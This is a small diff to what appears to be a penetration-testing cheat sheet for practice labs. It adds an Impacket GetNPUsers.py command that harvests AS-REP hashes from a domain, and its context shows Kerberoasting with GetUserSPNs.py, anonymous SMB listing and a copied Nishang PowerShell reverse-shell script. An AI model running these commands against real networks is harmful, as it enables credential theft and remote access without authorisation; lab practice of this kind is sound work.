@@ -44,6 +44,8 @@ GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
 smbclient -L //10.10.10.100   (enter if password is requested)
 smbclient -U anonymous  //10.10.10.130/batshare
 
+# get user hahses 
+GetNPUsers.py DOMAIN/ -usersfile ausers.txt
 
 SHELLS
 cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
